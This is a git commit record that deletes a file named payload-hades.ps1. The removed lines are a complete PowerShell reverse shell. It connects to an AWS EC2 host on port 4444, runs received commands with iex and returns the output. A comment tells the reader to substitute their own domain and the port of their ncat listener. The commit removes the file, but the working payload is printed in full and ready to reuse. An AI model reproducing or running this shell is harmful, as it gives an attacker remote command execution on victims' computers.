8f98acac22eba91b9cf71ab3010ae9067965dcb0
Yunus <91228300+seraphim721@users.noreply.github.com>
2022-03-14 14:08:43 -0400

    Delete payload-hades.ps1

--- payload-hades.ps1
+++
@@ -1,3 +0,0 @@
-#Change the domain name theboss.lol to your domain name and the port number 4444 to the port number ncat is listening to
-
-$sm=(New-Object Net.Sockets.TCPClient('ec2-13-38-115-218.eu-west-3.compute.amazonaws.com',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} 
